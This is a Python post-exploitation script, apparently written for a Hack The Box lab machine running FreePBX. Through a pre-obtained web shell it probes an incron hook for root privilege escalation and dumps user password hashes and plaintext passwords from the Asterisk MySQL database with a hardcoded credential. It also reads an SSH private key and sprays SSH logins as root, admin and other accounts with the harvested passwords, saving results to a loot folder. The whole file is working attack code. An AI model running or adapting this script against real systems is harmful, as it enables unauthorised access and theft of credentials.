#!/usr/bin/env python3
import hashlib
import pathlib
import random
import string
import subprocess
import sys

sys.path.insert(0, "/home/kali/Desktop/htb/Connected/scripts")
from enum_privesc import get_shell  # noqa: E402

IP = "10.129.245.100"
LOOT = pathlib.Path("/home/kali/Desktop/htb/Connected/loot")


def main():
    cmd, url = get_shell()
    lines = [f"shell: {url}\n"]
    tests = [
        ("incrond ps", "ps aux | grep -E incron | grep -v grep"),
        (
            "trigger dump-iptables",
            "rm -f /tmp/iptables-save-output; "
            "echo x > /var/spool/asterisk/incron/sysadmin.dump-iptables.CONTENTS; sleep 4; "
            "ls -la /tmp/iptables-save-output 2>&1; head -2 /tmp/iptables-save-output 2>&1",
        ),
        (
            "sysadmin logs",
            "grep -i 'sysadmin\\|hook' /var/log/messages 2>/dev/null | tail -25",
        ),
        (
            "ampusers",
            "mysql -u freepbxuser -p'mZzDpAGKTmPJ' -h127.0.0.1 asterisk "
            "-e 'SELECT username,password_sha1 FROM ampusers'",
        ),
        (
            "userman passwords",
            "mysql -u freepbxuser -p'mZzDpAGKTmPJ' -h127.0.0.1 asterisk "
            "-e \"SELECT username,password FROM userman_users WHERE password IS NOT NULL AND password!='' LIMIT 25\"",
        ),
        (
            "users table",
            "mysql -u freepbxuser -p'mZzDpAGKTmPJ' -h127.0.0.1 asterisk "
            "-e 'SELECT extension,password FROM users LIMIT 15' 2>&1",
        ),
        ("ssh", "ls -la /home/asterisk/.ssh 2>&1; cat /home/asterisk/.ssh/id_rsa 2>&1 | head -3"),
    ]
    root_ok = False
    for title, c in tests:
        o = cmd(c, timeout=120)
        lines.append(f"=== {title} ===\n{o}\n")
        print(f"## {title}\n{o[:2500]}\n")
        if title.startswith("trigger") and "iptables-save-output" in o and "cannot" not in o.lower()[:200]:
            if "-rw" in o:
                root_ok = True

    lines.append(f"ROOT_INCRON={root_ok}\n")
    text = "\n".join(lines)
    LOOT.joinpath("root-incron-ssh.txt").write_text(text)

    # SSH spray plaintext passwords from userman
    passes = set(["mZzDpAGKTmPJ"])
    for line in text.splitlines():
        if "|" in line and "password" not in line.lower() and "username" not in line:
            pass
    import re

    for m in re.finditer(r"\| ([^|]+) \| ([^|]+) \|", text):
        u, p = m.group(1).strip(), m.group(2).strip()
        if p and p != "password" and not p.startswith("password_sha"):
            if len(p) < 120 and " " not in p:
                passes.add(p)

    hits = []
    for u in ["admin", "root", "asterisk", "freepbx"]:
        for p in passes:
            r = subprocess.run(
                ["sshpass", "-p", p, "ssh", "-o", "StrictHostKeyChecking=no",
                 "-o", "ConnectTimeout=8", f"{u}@{IP}", "id"],
                capture_output=True, text=True, timeout=12,
            )
            if r.returncode == 0:
                hits.append(f"{u}:{p} -> {r.stdout.strip()}")

    LOOT.joinpath("ssh-spray.txt").write_text("\n".join(hits) or "no hits")
    print("ROOT_INCRON", root_ok)
    print("SSH", hits)


if __name__ == "__main__":
    main()